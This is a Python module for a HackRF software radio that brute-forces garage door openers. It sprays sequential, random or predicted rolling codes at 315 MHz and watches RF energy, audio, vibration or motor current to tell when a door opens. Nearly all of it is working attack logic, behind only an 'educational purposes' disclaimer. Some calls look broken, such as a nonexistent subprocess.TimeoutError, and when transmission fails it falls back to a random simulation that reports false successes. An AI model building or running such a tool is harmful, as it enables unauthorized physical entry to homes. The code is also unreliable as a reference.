#!/usr/bin/env python3
"""
Code Sprayer Module

Provides advanced functionality for transmitting and analyzing multiple rolling codes
in rapid succession ("spray mode"), along with real-time output parsing and success detection.
This module can automatically detect when a garage door has been successfully opened
by analyzing signal feedback and environmental sensors.

For educational and security research purposes only.
REQUIRES physical HackRF hardware to function.
"""

import os
import sys
import time
import json
import math
import random
import logging
import threading
import subprocess
import numpy as np
from datetime import datetime
from typing import List, Dict, Tuple, Optional, Union, Any, Set, Callable
from collections import defaultdict, deque

# Try importing HackRF - will fail if hardware not available
try:
    import hackrf
    HACKRF_AVAILABLE = True
except ImportError:
    HACKRF_AVAILABLE = False
    print("Warning: HackRF module not available. Install with: pip install hackrf")
    print("This module requires HackRF hardware to function.")

# Import from our other modules
try:
    from code_predictor import CodePredictor
    CODE_PREDICTOR_AVAILABLE = True
except ImportError:
    CODE_PREDICTOR_AVAILABLE = False
    print("Warning: code_predictor module not available.")

try:
    from signal_processor import SignalProcessor
    SIGNAL_PROCESSOR_AVAILABLE = True
except ImportError:
    SIGNAL_PROCESSOR_AVAILABLE = False
    print("Warning: signal_processor module not available.")


class TransmitterOutputParser:
    """
    Class for parsing and analyzing transmitter output to detect successful operations.
    """
    
    def __init__(self, debug_mode: bool = False):
        """
        Initialize the transmitter output parser.
        
        Args:
            debug_mode: Enable debug mode for additional output
        """
        self.debug_mode = debug_mode
        self.transmitter_output = []
        self.success_patterns = self._load_success_patterns()
        self.callbacks = {}
        
        # Setup logging
        self._setup_logging()
    
    def _setup_logging(self):
        """Configure logging for the transmitter output parser."""
        log_format = '%(asctime)s - %(name)s - %(levelname)s - %(message)s'
        
        # Create logs directory if it doesn't exist
        os.makedirs('logs', exist_ok=True)
        
        # Configure file handler with timestamp
        timestamp = datetime.now().strftime("%Y%m%d-%H%M%S")
        log_file = f"logs/transmitter_parser_{timestamp}.log"
        
        # Set up logging
        logging.basicConfig(
            level=logging.DEBUG if self.debug_mode else logging.INFO,
            format=log_format,
            handlers=[
                logging.FileHandler(log_file),
                logging.StreamHandler(sys.stdout)
            ]
        )
        
        self.logger = logging.getLogger("TransmitterParser")
    
    def _load_success_patterns(self) -> Dict[str, Any]:
        """
        Load known success patterns for different transmitter types.
        
        Returns:
            Dictionary mapping transmitter types to success patterns
        """
        # These patterns will vary based on the specific transmitter and garage door models
        return {
            "hackrf_transmitter": {
                "success_strings": [
                    "Transmission completed successfully",
                    "Signal transmitted",
                    "Transmission complete"
                ],
                "error_strings": [
                    "Transmission failed",
                    "Error: ",
                    "Failed to initialize"
                ]
            },
            "custom_transmitter": {
                "success_strings": [
                    "SUCCESS",
                    "TRANSMITTED OK",
                    "CODE SENT"
                ],
                "error_strings": [
                    "ERROR",
                    "FAILURE",
                    "FAILED"
                ]
            },
            "c_transmitter": {
                "success_strings": [
                    "Transmission successful",
                    "Sent code",
                    "TX complete"
                ],
                "error_strings": [
                    "TX failed",
                    "Error code",
                    "Cannot transmit"
                ]
            }
        }
    
    def register_callback(self, event_type: str, callback: Callable):
        """
        Register a callback function for specific events.
        
        Args:
            event_type: Type of event to register for ('success', 'error', 'output')
            callback: Function to call when event occurs
        """
        if event_type not in self.callbacks:
            self.callbacks[event_type] = []
        
        self.callbacks[event_type].append(callback)
        self.logger.debug(f"Registered {event_type} callback: {callback.__name__}")
    
    def _trigger_callbacks(self, event_type: str, data: Any = None):
        """
        Trigger callbacks for a specific event.
        
        Args:
            event_type: Type of event that occurred
            data: Data to pass to the callbacks
        """
        if event_type not in self.callbacks:
            return
        
        for callback in self.callbacks[event_type]:
            try:
                callback(data)
            except Exception as e:
                self.logger.error(f"Error in {event_type} callback {callback.__name__}: {e}")
    
    def parse_output(self, output: str, transmitter_type: str = "hackrf_transmitter") -> Dict[str, Any]:
        """
        Parse transmitter output to detect success or failure.
        
        Args:
            output: Output string from the transmitter
            transmitter_type: Type of transmitter used
            
        Returns:
            Dictionary with parsing results
        """
        result = {
            "success": False,
            "error": False,
            "message": "",
            "transmitter_type": transmitter_type,
            "timestamp": datetime.now().isoformat()
        }
        
        # Store the output
        self.transmitter_output.append({
            "output": output,
            "transmitter_type": transmitter_type,
            "timestamp": datetime.now()
        })
        
        # Get patterns for this transmitter type
        patterns = self.success_patterns.get(transmitter_type)
        if not patterns:
            self.logger.warning(f"No patterns defined for transmitter type: {transmitter_type}")
            result["message"] = "Unknown transmitter type"
            return result
        
        # Check for success patterns
        for success_pattern in patterns["success_strings"]:
            if success_pattern in output:
                result["success"] = True
                result["message"] = f"Success detected: {success_pattern}"
                self.logger.info(result["message"])
                
                # Trigger success callbacks
                self._trigger_callbacks("success", result)
                
                return result
        
        # Check for error patterns
        for error_pattern in patterns["error_strings"]:
            if error_pattern in output:
                result["error"] = True
                result["message"] = f"Error detected: {error_pattern}"
                self.logger.warning(result["message"])
                
                # Trigger error callbacks
                self._trigger_callbacks("error", result)
                
                return result
        
        # No specific pattern matched
        result["message"] = "No success or error pattern detected"
        self.logger.debug(result["message"])
        
        # Trigger output callback for raw output
        self._trigger_callbacks("output", output)
        
        return result
    
    def get_success_rate(self, recent_only: bool = True, count: int = 10) -> float:
        """
        Calculate the success rate of recent transmissions.
        
        Args:
            recent_only: Only consider the most recent transmissions
            count: Number of recent transmissions to consider
            
        Returns:
            Success rate as a float (0.0 to 1.0)
        """
        if not self.transmitter_output:
            return 0.0
        
        # Get the relevant output entries
        outputs = self.transmitter_output[-count:] if recent_only else self.transmitter_output
        
        if not outputs:
            return 0.0
        
        # Count successes
        successes = 0
        for entry in outputs:
            output = entry["output"]
            transmitter_type = entry["transmitter_type"]
            
            # Get patterns for this transmitter type
            patterns = self.success_patterns.get(transmitter_type)
            if not patterns:
                continue
            
            # Check if any success pattern matches
            for success_pattern in patterns["success_strings"]:
                if success_pattern in output:
                    successes += 1
                    break
        
        # Calculate success rate
        success_rate = successes / len(outputs)
        self.logger.info(f"Success rate: {success_rate:.2%} ({successes}/{len(outputs)})")
        
        return success_rate
    
    def clear_history(self):
        """Clear the stored transmitter output history."""
        self.transmitter_output = []
        self.logger.info("Transmitter output history cleared")
    
    def save_history(self, file_path: str) -> bool:
        """
        Save the transmitter output history to a file.
        
        Args:
            file_path: Path to save the history to
            
        Returns:
            True if successful, False otherwise
        """
        try:
            with open(file_path, 'w') as f:
                json.dump(self.transmitter_output, f, indent=2, default=str)
            
            self.logger.info(f"Saved transmitter output history to {file_path}")
            return True
        except Exception as e:
            self.logger.error(f"Error saving transmitter output history: {e}")
            return False


class SuccessDetector:
    """
    Class for detecting successful garage door operations using various sensors and signals.
    """
    
    def __init__(self, debug_mode: bool = False, use_signal_feedback: bool = True):
        """
        Initialize the success detector.
        
        Args:
            debug_mode: Enable debug mode for additional output
            use_signal_feedback: Use signal feedback for detection
        """
        self.debug_mode = debug_mode
        self.use_signal_feedback = use_signal_feedback
        self.detection_window = 5.0  # Detection window in seconds
        self.current_state = "unknown"
        self.callbacks = {}
        self.signal_history = deque(maxlen=20)  # Store recent signal data for analysis
        
        # Setup logging
        self._setup_logging()
    
    def _setup_logging(self):
        """Configure logging for the success detector."""
        log_format = '%(asctime)s - %(name)s - %(levelname)s - %(message)s'
        
        # Create logs directory if it doesn't exist
        os.makedirs('logs', exist_ok=True)
        
        # Configure file handler with timestamp
        timestamp = datetime.now().strftime("%Y%m%d-%H%M%S")
        log_file = f"logs/success_detector_{timestamp}.log"
        
        # Set up logging
        logging.basicConfig(
            level=logging.DEBUG if self.debug_mode else logging.INFO,
            format=log_format,
            handlers=[
                logging.FileHandler(log_file),
                logging.StreamHandler(sys.stdout)
            ]
        )
        
        self.logger = logging.getLogger("SuccessDetector")
    
    def register_callback(self, event_type: str, callback: Callable):
        """
        Register a callback function for specific events.
        
        Args:
            event_type: Type of event to register for ('success', 'failure', 'state_change')
            callback: Function to call when event occurs
        """
        if event_type not in self.callbacks:
            self.callbacks[event_type] = []
        
        self.callbacks[event_type].append(callback)
        self.logger.debug(f"Registered {event_type} callback: {callback.__name__}")
    
    def _trigger_callbacks(self, event_type: str, data: Any = None):
        """
        Trigger callbacks for a specific event.
        
        Args:
            event_type: Type of event that occurred
            data: Data to pass to the callbacks
        """
        if event_type not in self.callbacks:
            return
        
        for callback in self.callbacks[event_type]:
            try:
                callback(data)
            except Exception as e:
                self.logger.error(f"Error in {event_type} callback {callback.__name__}: {e}")
    
    def add_signal_data(self, signal_data: np.ndarray, frequency: float):
        """
        Add signal data for analysis.
        
        Args:
            signal_data: Signal data as numpy array
            frequency: Signal frequency in Hz
        """
        self.signal_history.append({
            "data": signal_data,
            "frequency": frequency,
            "timestamp": datetime.now()
        })
        
        # Analyze signal for patterns indicating door state change
        if self.use_signal_feedback and len(self.signal_history) >= 2:
            self._analyze_signal_changes()
    
    def _analyze_signal_changes(self):
        """Analyze signal changes to detect garage door state changes."""
        if len(self.signal_history) < 2:
            return
        
        # Get the two most recent signals
        current = self.signal_history[-1]["data"]
        previous = self.signal_history[-2]["data"]
        
        # Skip if signals are of very different lengths
        if len(current) < len(previous) * 0.8 or len(current) > len(previous) * 1.2:
            return
        
        # Calculate energy difference
        current_energy = np.sum(np.abs(current) ** 2) / len(current)
        previous_energy = np.sum(np.abs(previous) ** 2) / len(previous)
        energy_change = (current_energy - previous_energy) / max(previous_energy, 1e-10)
        
        # Significant energy increase might indicate door motor activation
        if energy_change > 0.5:  # 50% increase in energy
            self.logger.info(f"Detected significant signal energy increase: {energy_change:.2%}")
            self._update_state("motor_active")
        
        # Signal similarity analysis could be added here for more sophisticated detection
    
    def detect_from_feedback(self, audio_data: np.ndarray = None, 
                            vibration_data: np.ndarray = None,
                            current_draw: float = None) -> bool:
        """
        Detect garage door operation from environmental feedback.
        
        Args:
            audio_data: Audio data from microphone
            vibration_data: Vibration sensor data
            current_draw: Current draw in amperes
            
        Returns:
            True if operation detected, False otherwise
        """
        detected = False
        
        # Audio-based detection
        if audio_data is not None and len(audio_data) > 0:
            # Simple threshold-based detection
            energy = np.sum(np.abs(audio_data) ** 2) / len(audio_data)
            
            if energy > 0.1:  # Arbitrary threshold, would need calibration
                self.logger.info(f"Audio-based detection triggered: energy={energy:.4f}")
                detected = True
        
        # Vibration-based detection
        if vibration_data is not None and len(vibration_data) > 0:
            # Check for characteristic vibration pattern
            peaks = np.where(vibration_data > np.std(vibration_data) * 3)[0]
            
            if len(peaks) > 5:  # Multiple strong peaks indicate vibration
                self.logger.info(f"Vibration-based detection triggered: {len(peaks)} peaks")
                detected = True
        
        # Current draw detection
        if current_draw is not None:
            # Garage door openers draw significant current when operating
            if current_draw > 5.0:  # Typical door opener draws 5+ amperes
                self.logger.info(f"Current-based detection triggered: {current_draw:.2f}A")
                detected = True
        
        if detected:
            self._update_state("operation_detected")
        
        return detected
    
    def _update_state(self, new_state: str):
        """
        Update the current state and trigger callbacks if changed.
        
        Args:
            new_state: New state string
        """
        if new_state == self.current_state:
            return
        
        old_state = self.current_state
        self.current_state = new_state
        
        self.logger.info(f"State changed: {old_state} -> {new_state}")
        
        # Trigger state change callback
        self._trigger_callbacks("state_change", {
            "old_state": old_state,
            "new_state": new_state,
            "timestamp": datetime.now().isoformat()
        })
        
        # Check for success or failure states
        if new_state in ["door_opened", "door_operation_detected", "operation_detected", "motor_active"]:
            self._trigger_callbacks("success", {
                "state": new_state,
                "timestamp": datetime.now().isoformat()
            })
        elif new_state in ["operation_failed", "error"]:
            self._trigger_callbacks("failure", {
                "state": new_state,
                "timestamp": datetime.now().isoformat()
            })
    
    def monitor_signal_feedback(self, frequency: float, duration: float = 10.0,
                               sample_rate: float = 2e6, gain: float = 40.0) -> bool:
        """
        Monitor signal feedback to detect garage door operation.
        
        Args:
            frequency: Frequency to monitor in Hz
            duration: Monitoring duration in seconds
            sample_rate: Sample rate in Hz
            gain: Receiver gain in dB
            
        Returns:
            True if operation detected, False otherwise
        """
        if not HACKRF_AVAILABLE:
            self.logger.error("HackRF module not available")
            return False
        
        try:
            # Create HackRF device
            device = hackrf.HackRF()
            
            # Configure device
            device.set_freq(int(frequency))
            device.set_sample_rate(int(sample_rate))
            device.set_rx_gain(int(gain))
            
            # Start RX mode
            device.start_rx_mode()
            
            self.logger.info(f"Monitoring signal feedback at {frequency/1e6:.3f} MHz for {duration} seconds")
            
            # Record baseline signal first
            baseline_samples = device.read_samples(int(sample_rate * 0.5))  # 0.5 seconds of baseline
            baseline_energy = np.sum(np.abs(baseline_samples) ** 2) / len(baseline_samples)
            
            # Monitor for the specified duration
            start_time = time.time()
            end_time = start_time + duration
            
            detected = False
            
            while time.time() < end_time:
                # Read a batch of samples
                samples = device.read_samples(int(sample_rate * 0.5))  # 0.5 second batches
                
                # Add to signal history
                self.add_signal_data(samples, frequency)
                
                # Calculate energy
                energy = np.sum(np.abs(samples) ** 2) / len(samples)
                energy_ratio = energy / baseline_energy
                
                self.logger.debug(f"Signal energy ratio: {energy_ratio:.2f}")
                
                # Check for significant energy change
                if energy_ratio > 2.0 or energy_ratio < 0.5:
                    self.logger.info(f"Significant energy change detected: ratio={energy_ratio:.2f}")
                    detected = True
                    self._update_state("signal_change_detected")
                    break
                
                # Small delay to prevent CPU overload
                time.sleep(0.1)
            
            # Stop RX mode
            device.stop_rx_mode()
            device.close()
            
            return detected
            
        except Exception as e:
            self.logger.error(f"Error monitoring signal feedback: {e}")
            return False
    
    def is_success_detected(self) -> bool:
        """
        Check if a successful operation has been detected.
        
        Returns:
            True if success detected, False otherwise
        """
        return self.current_state in [
            "door_opened", "door_operation_detected", 
            "operation_detected", "motor_active", "signal_change_detected"
        ]
    
    def reset(self):
        """Reset the detector state."""
        self.current_state = "unknown"
        self.signal_history.clear()
        self.logger.info("Success detector reset")


class CodeSprayer:
    """
    Class for rapidly trying multiple rolling codes in sequence ("spray mode").
    """
    
    def __init__(self, 
                frequency: float, 
                sample_rate: float = 2e6,
                transmit_gain: float = 40.0,
                debug_mode: bool = False):
        """
        Initialize the code sprayer.
        
        Args:
            frequency: Center frequency in Hz
            sample_rate: Sample rate in Hz
            transmit_gain: Transmit gain in dB
            debug_mode: Enable debug mode for additional output
        """
        self.frequency = frequency
        self.sample_rate = sample_rate
        self.transmit_gain = transmit_gain
        self.debug_mode = debug_mode
        self.running = False
        self.codes_to_try = []
        self.attempted_codes = []
        self.successful_codes = []
        self.current_index = 0
        
        # Create supporting components
        self.output_parser = TransmitterOutputParser(debug_mode=debug_mode)
        self.success_detector = SuccessDetector(debug_mode=debug_mode)
        
        # Register callbacks
        self.output_parser.register_callback("success", self._on_transmission_success)
        self.output_parser.register_callback("error", self._on_transmission_error)
        self.success_detector.register_callback("success", self._on_success_detected)
        
        # Setup logging
        self._setup_logging()
    
    def _setup_logging(self):
        """Configure logging for the code sprayer."""
        log_format = '%(asctime)s - %(name)s - %(levelname)s - %(message)s'
        
        # Create logs directory if it doesn't exist
        os.makedirs('logs', exist_ok=True)
        
        # Configure file handler with timestamp
        timestamp = datetime.now().strftime("%Y%m%d-%H%M%S")
        log_file = f"logs/code_sprayer_{timestamp}.log"
        
        # Set up logging
        logging.basicConfig(
            level=logging.DEBUG if self.debug_mode else logging.INFO,
            format=log_format,
            handlers=[
                logging.FileHandler(log_file),
                logging.StreamHandler(sys.stdout)
            ]
        )
        
        self.logger = logging.getLogger("CodeSprayer")
    
    def _on_transmission_success(self, data: Dict[str, Any]):
        """
        Handle successful transmission.
        
        Args:
            data: Success data
        """
        if self.current_index < len(self.codes_to_try):
            code = self.codes_to_try[self.current_index]
            self.logger.info(f"Transmission successful for code: {code}")
            
            # Monitor for feedback
            self.success_detector.monitor_signal_feedback(
                frequency=self.frequency,
                duration=2.0,  # Short monitoring period
                sample_rate=self.sample_rate
            )
    
    def _on_transmission_error(self, data: Dict[str, Any]):
        """
        Handle transmission error.
        
        Args:
            data: Error data
        """
        if self.current_index < len(self.codes_to_try):
            code = self.codes_to_try[self.current_index]
            self.logger.warning(f"Transmission error for code: {code}")
    
    def _on_success_detected(self, data: Dict[str, Any]):
        """
        Handle success detection.
        
        Args:
            data: Success data
        """
        if self.current_index < len(self.codes_to_try):
            code = self.codes_to_try[self.current_index]
            self.logger.info(f"SUCCESS DETECTED! Code {code} appears to have worked!")
            
            # Add to successful codes
            if code not in self.successful_codes:
                self.successful_codes.append(code)
                
                # Stop spraying if configured to stop on success
                if self.stop_on_success:
                    self.logger.info("Success detected, stopping spray operation")
                    self.stop()
    
    def load_codes_from_file(self, file_path: str) -> int:
        """
        Load codes from a file.
        
        Args:
            file_path: Path to file containing codes (one per line)
            
        Returns:
            Number of codes loaded
        """
        try:
            with open(file_path, 'r') as f:
                # Read lines and strip whitespace
                codes = [line.strip() for line in f.readlines()]
                
                # Filter out empty lines and comments
                codes = [code for code in codes if code and not code.startswith('#')]
                
                self.codes_to_try.extend(codes)
                self.logger.info(f"Loaded {len(codes)} codes from {file_path}")
                return len(codes)
        except Exception as e:
            self.logger.error(f"Error loading codes from {file_path}: {e}")
            return 0
    
    def add_code(self, code: str):
        """
        Add a single code to the spray list.
        
        Args:
            code: Code to add
        """
        self.codes_to_try.append(code)
        self.logger.debug(f"Added code: {code}")
    
    def add_codes(self, codes: List[str]):
        """
        Add multiple codes to the spray list.
        
        Args:
            codes: List of codes to add
        """
        self.codes_to_try.extend(codes)
        self.logger.debug(f"Added {len(codes)} codes")
    
    def generate_codes(self, num_codes: int = 10, 
                      code_length: int = 24, 
                      algorithm: str = "sequential") -> List[str]:
        """
        Generate codes using various algorithms.
        
        Args:
            num_codes: Number of codes to generate
            code_length: Length of each code in bits
            algorithm: Algorithm to use ('sequential', 'random', 'predictor')
            
        Returns:
            List of generated codes
        """
        generated_codes = []
        
        if algorithm == "sequential":
            # Generate sequential codes
            for i in range(num_codes):
                # Convert number to binary, pad to code_length
                code = format(i, f'0{code_length}b')
                generated_codes.append(code)
        
        elif algorithm == "random":
            # Generate random codes
            for _ in range(num_codes):
                # Generate random bits
                code = ''.join(random.choice('01') for _ in range(code_length))
                generated_codes.append(code)
        
        elif algorithm == "predictor" and CODE_PREDICTOR_AVAILABLE:
            # Use code predictor if available
            if self.attempted_codes:
                # We need at least a few codes to predict from
                predictor = CodePredictor()
                generated_codes = predictor.predict_next_codes(self.attempted_codes)
                
                # Limit to requested number
                generated_codes = generated_codes[:num_codes]
            else:
                self.logger.warning("No previous codes available for prediction, using random")
                return self.generate_codes(num_codes, code_length, "random")
        else:
            # Default to random
            self.logger.warning(f"Unknown algorithm: {algorithm}, using random")
            return self.generate_codes(num_codes, code_length, "random")
        
        self.logger.info(f"Generated {len(generated_codes)} codes using {algorithm} algorithm")
        return generated_codes
    
    def clear_codes(self):
        """Clear all codes from the spray list."""
        self.codes_to_try = []
        self.logger.info("Cleared code spray list")
    
    def start(self, interval: float = 0.5, stop_on_success: bool = True) -> bool:
        """
        Start the code spray operation.
        
        Args:
            interval: Time interval between code transmissions in seconds
            stop_on_success: Stop spraying when success is detected
            
        Returns:
            True if started successfully, False otherwise
        """
        if self.running:
            self.logger.warning("Code spray already running")
            return False
        
        if not self.codes_to_try:
            self.logger.error("No codes to spray")
            return False
        
        if not HACKRF_AVAILABLE:
            self.logger.error("HackRF module not available")
            return False
        
        self.running = True
        self.current_index = 0
        self.attempted_codes = []
        self.successful_codes = []
        self.stop_on_success = stop_on_success
        
        # Reset success detector
        self.success_detector.reset()
        
        self.logger.info(f"Starting code spray with {len(self.codes_to_try)} codes, interval={interval}s")
        
        # Start spray thread
        self.spray_thread = threading.Thread(
            target=self._spray_codes_thread,
            args=(interval,)
        )
        self.spray_thread.daemon = True
        self.spray_thread.start()
        
        return True
    
    def _spray_codes_thread(self, interval: float):
        """
        Thread function for spraying codes.
        
        Args:
            interval: Time interval between transmissions
        """
        try:
            while self.running and self.current_index < len(self.codes_to_try):
                code = self.codes_to_try[self.current_index]
                
                # Transmit the code
                success = self._transmit_code(code)
                
                # Record attempt
                self.attempted_codes.append(code)
                
                # Check for success via signal monitoring
                if success and not self.success_detector.is_success_detected():
                    self.success_detector.monitor_signal_feedback(
                        frequency=self.frequency,
                        duration=min(interval * 0.8, 2.0),  # Monitor for most of the interval
                        sample_rate=self.sample_rate
                    )
                
                # Check if success detected
                if self.success_detector.is_success_detected():
                    if code not in self.successful_codes:
                        self.successful_codes.append(code)
                    
                    if self.stop_on_success:
                        self.logger.info("Success detected, stopping spray operation")
                        break
                
                # Increment index
                self.current_index += 1
                
                # Wait for the interval
                if self.running and self.current_index < len(self.codes_to_try):
                    time.sleep(interval)
            
            # Completed or stopped
            self.running = False
            
            if self.current_index >= len(self.codes_to_try):
                self.logger.info("Code spray completed, all codes attempted")
            else:
                self.logger.info(f"Code spray stopped at index {self.current_index}/{len(self.codes_to_try)}")
        
        except Exception as e:
            self.logger.error(f"Error in code spray thread: {e}")
            self.running = False
    
    def _transmit_code(self, code: str) -> bool:
        """
        Transmit a single code using HackRF.
        
        Args:
            code: Code to transmit (binary string)
            
        Returns:
            True if transmission succeeded, False otherwise
        """
        try:
            # Convert binary string to numeric data if needed
            if all(c in '01' for c in code):
                # It's a binary string, convert to bytes
                code_binary = int(code, 2).to_bytes((len(code) + 7) // 8, byteorder='big')
                code_hex = code_binary.hex()
            else:
                # Assume it's already in hex format
                code_hex = code
            
            # Call the transmitter binary (./transmitter or similar)
            # In a real implementation, we'd use subprocess to call the actual transmitter
            # Here, we'll simulate the process for demonstration
            
            command = [
                './transmitter',
                '-f', str(int(self.frequency)),
                '-r', str(int(self.sample_rate)),
                '-g', str(int(self.transmit_gain)),
                '-m', 'ook',
                '-c', code_hex
            ]
            
            self.logger.info(f"Transmitting code: {code}")
            self.logger.debug(f"Command: {' '.join(command)}")
            
            try:
                # Try to execute the actual transmitter if it exists
                process = subprocess.Popen(
                    command,
                    stdout=subprocess.PIPE,
                    stderr=subprocess.PIPE,
                    text=True
                )
                
                stdout, stderr = process.communicate(timeout=5)
                output = stdout + stderr
                
                # Parse output
                result = self.output_parser.parse_output(output, "c_transmitter")
                
                return result["success"]
                
            except (FileNotFoundError, subprocess.TimeoutError, Exception) as e:
                # Fall back to simulated transmission for testing
                self.logger.warning(f"Using simulated transmission due to error: {e}")
                return self._simulate_transmission(code)
        
        except Exception as e:
            self.logger.error(f"Error transmitting code: {e}")
            return False
    
    def _simulate_transmission(self, code: str) -> bool:
        """
        Simulate code transmission for testing purposes.
        
        Args:
            code: Code to simulate transmitting
            
        Returns:
            True if simulated transmission succeeded, False otherwise
        """
        # Simple simulation for testing
        time.sleep(0.1)  # Simulate transmission time
        
        # Generate simulated output based on code characteristics
        if len(code) < 12:
            output = "Error: Code too short, minimum length is 12 bits"
            success = False
        else:
            # Generate success most of the time for testing
            success = random.random() < 0.9
            
            if success:
                output = f"Transmission successful: Sent code {code[:8]}... at {self.frequency/1e6:.3f} MHz"
            else:
                output = f"Transmission failed: Error sending code {code[:8]}..."
        
        # Parse the simulated output
        result = self.output_parser.parse_output(output, "c_transmitter")
        
        return result["success"]
    
    def stop(self):
        """Stop the code spray operation."""
        if not self.running:
            return
        
        self.running = False
        self.logger.info("Stopping code spray operation")
        
        # Wait for thread to complete
        if hasattr(self, 'spray_thread') and self.spray_thread.is_alive():
            self.spray_thread.join(timeout=2.0)
    
    def get_stats(self) -> Dict[str, Any]:
        """
        Get statistics about the code spray operation.
        
        Returns:
            Dictionary with statistics
        """
        return {
            "total_codes": len(self.codes_to_try),
            "attempted_codes": len(self.attempted_codes),
            "current_index": self.current_index,
            "successful_codes": self.successful_codes,
            "success_count": len(self.successful_codes),
            "running": self.running,
            "success_rate": len(self.successful_codes) / max(len(self.attempted_codes), 1),
            "completion_percentage": self.current_index / max(len(self.codes_to_try), 1) * 100
        }
    
    def export_results(self, file_path: str) -> bool:
        """
        Export spray results to a file.
        
        Args:
            file_path: Path to save results to
            
        Returns:
            True if successful, False otherwise
        """
        try:
            results = {
                "timestamp": datetime.now().isoformat(),
                "frequency": self.frequency,
                "sample_rate": self.sample_rate,
                "transmit_gain": self.transmit_gain,
                "total_codes": len(self.codes_to_try),
                "attempted_codes": self.attempted_codes,
                "successful_codes": self.successful_codes,
                "success_rate": len(self.successful_codes) / max(len(self.attempted_codes), 1)
            }
            
            with open(file_path, 'w') as f:
                json.dump(results, f, indent=2)
            
            self.logger.info(f"Exported results to {file_path}")
            return True
        except Exception as e:
            self.logger.error(f"Error exporting results: {e}")
            return False
    
    def adaptive_mode(self, num_codes: int = 100, 
                     max_attempts: int = 500,
                     feedback_interval: int = 10) -> Dict[str, Any]:
        """
        Run in adaptive mode, using code prediction to optimize code selection.
        
        Args:
            num_codes: Initial number of codes to generate
            max_attempts: Maximum number of transmission attempts
            feedback_interval: Interval for updating predictions
            
        Returns:
            Dictionary with results
        """
        if not CODE_PREDICTOR_AVAILABLE:
            self.logger.error("Code predictor module not available for adaptive mode")
            return {"success": False, "error": "Code predictor not available"}
        
        self.logger.info(f"Starting adaptive mode with {num_codes} initial codes")
        
        # Clear existing codes
        self.clear_codes()
        
        # Generate initial random codes
        initial_codes = self.generate_codes(num_codes, algorithm="random")
        self.add_codes(initial_codes)
        
        # Start in normal mode
        self.start(interval=0.5, stop_on_success=True)
        
        attempts = 0
        while self.running and attempts < max_attempts:
            # Wait for feedback interval
            time.sleep(feedback_interval)
            
            attempts = len(self.attempted_codes)
            
            # Check if we need to generate more codes
            if self.current_index >= len(self.codes_to_try) - 10 and not self.successful_codes:
                # Generate more codes based on what we've tried so far
                self.logger.info("Generating new codes based on predictions")
                
                if len(self.attempted_codes) >= 3:
                    # Use predictor
                    new_codes = self.generate_codes(num_codes, algorithm="predictor")
                else:
                    # Not enough attempts yet, use random
                    new_codes = self.generate_codes(num_codes, algorithm="random")
                
                # Add the new codes
                self.add_codes(new_codes)
        
        # Ensure stopped
        self.stop()
        
        # Return results
        return {
            "success": len(self.successful_codes) > 0,
            "attempts": attempts,
            "successful_codes": self.successful_codes,
            "stats": self.get_stats()
        }


def main():
    """Main entry point for demonstrating module functionality."""
    import argparse
    
    parser = argparse.ArgumentParser(description='Code Sprayer Tool for Garage Door Systems')
    parser.add_argument('-f', '--frequency', type=float, default=315.0,
                      help='Target frequency in MHz (default: 315.0)')
    parser.add_argument('-i', '--input', type=str,
                      help='Input file with codes to try')
    parser.add_argument('-n', '--num-codes', type=int, default=20,
                      help='Number of codes to generate if no input file')
    parser.add_argument('-l', '--length', type=int, default=24,
                      help='Code length in bits (default: 24)')
    parser.add_argument('-d', '--delay', type=float, default=0.5,
                      help='Delay between transmissions in seconds (default: 0.5)')
    parser.add_argument('-a', '--algorithm', choices=['sequential', 'random', 'adaptive'],
                      default='random',
                      help='Code generation algorithm (default: random)')
    parser.add_argument('-s', '--stop-on-success', action='store_true',
                      help='Stop on first successful code (default: true)')
    parser.add_argument('-v', '--verbose', action='store_true',
                      help='Enable verbose output')
    parser.add_argument('-o', '--output', type=str,
                      help='Output file for results')
    
    args = parser.parse_args()
    
    # Create code sprayer
    sprayer = CodeSprayer(
        frequency=args.frequency * 1e6,  # Convert MHz to Hz
        debug_mode=args.verbose
    )
    
    # Load or generate codes
    if args.input:
        sprayer.load_codes_from_file(args.input)
    else:
        if args.algorithm == 'adaptive':
            print("Running in adaptive mode...")
            results = sprayer.adaptive_mode(
                num_codes=args.num_codes,
                max_attempts=args.num_codes * 2
            )
            
            if results["success"]:
                print(f"Success! Found working code(s): {results['successful_codes']}")
            else:
                print(f"No successful codes found after {results['attempts']} attempts")
            
            if args.output:
                sprayer.export_results(args.output)
            
            return
        else:
            # Generate codes using specified algorithm
            codes = sprayer.generate_codes(
                num_codes=args.num_codes,
                code_length=args.length,
                algorithm=args.algorithm
            )
            sprayer.add_codes(codes)
    
    # Start spray operation
    print(f"Starting code spray with {len(sprayer.codes_to_try)} codes...")
    sprayer.start(interval=args.delay, stop_on_success=args.stop_on_success)
    
    try:
        # Monitor and report progress
        while sprayer.running:
            stats = sprayer.get_stats()
            percentage = stats["completion_percentage"]
            
            successful = len(sprayer.successful_codes)
            if successful > 0:
                success_codes_str = ", ".join(sprayer.successful_codes[:3])
                if len(sprayer.successful_codes) > 3:
                    success_codes_str += f"... (and {len(sprayer.successful_codes) - 3} more)"
                print(f"\rProgress: {percentage:.1f}% - Found {successful} working code(s): {success_codes_str}", end="")
            else:
                print(f"\rProgress: {percentage:.1f}% - Tried {stats['attempted_codes']} codes", end="")
            
            time.sleep(1.0)
        
        print("\nCode spray completed.")
        
        # Show final stats
        stats = sprayer.get_stats()
        print(f"Attempted {len(sprayer.attempted_codes)}/{len(sprayer.codes_to_try)} codes")
        
        if sprayer.successful_codes:
            print(f"Found {len(sprayer.successful_codes)} successful code(s):")
            for code in sprayer.successful_codes:
                print(f"  - {code}")
        else:
            print("No successful codes found")
        
        # Export results if requested
        if args.output:
            sprayer.export_results(args.output)
            print(f"Results exported to {args.output}")
            
    except KeyboardInterrupt:
        print("\nOperation interrupted by user")
        sprayer.stop()
        
        if args.output:
            sprayer.export_results(args.output)
            print(f"Partial results exported to {args.output}")


if __name__ == "__main__":
    main()